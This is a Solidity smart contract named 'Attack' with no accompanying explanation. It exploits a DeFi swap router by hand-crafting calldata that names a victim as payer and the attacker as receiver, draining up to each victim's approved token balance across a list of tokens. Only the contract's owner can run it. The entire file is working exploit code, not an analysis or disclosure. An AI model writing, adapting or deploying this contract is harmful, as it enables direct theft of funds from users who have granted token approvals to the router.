// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

struct BaseData {
    uint256 amount;
    uint256 amountLimit;
    address payer;
    address receiver;
    uint8 flags;
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract Attack {
    address private owner;

    constructor(address _owner) {
        owner = _owner;
    }

    receive() external payable {}

    // selector: 0x30f5d90e
    function exploit(address router, address victim, address[] calldata tokens) external payable {
        require(tx.origin == owner);
        require(msg.sender == tx.origin);

        for (uint256 i = 0; i < tokens.length; i++) {
            bytes memory filler = new bytes(0x60);

            BaseData memory base;
            PoolKey memory key;

            base.amount = _getAmount(tokens[i], victim, router);
            base.payer = victim;
            base.receiver = msg.sender;
            base.flags = 1; // SINGLE_SWAP

            key.currency1 = tokens[i];
            key.fee = 500;  // 0.05%
            key.tickSpacing = 10;

            bytes memory innerData = abi.encode(base, false, key, "");

            bytes memory callData = abi.encodePacked(
                bytes4(0xaf2b4aba),
                uint256(0xC0),
                block.timestamp,
                filler,
                uint256(uint160(address(this))),
                uint256(innerData.length),
                innerData
            );

            (bool success, ) = router.call(callData);
            require(success);
        }
    }

    function _getAmount(
        address token,
        address victim,
        address spender
    ) internal view returns (uint256) {
        uint256 balance = IERC20(token).balanceOf(victim);
        uint256 allowance = IERC20(token).allowance(victim, spender);
        if (allowance < balance) {
            balance = allowance;
        }
        return balance;
    }
}
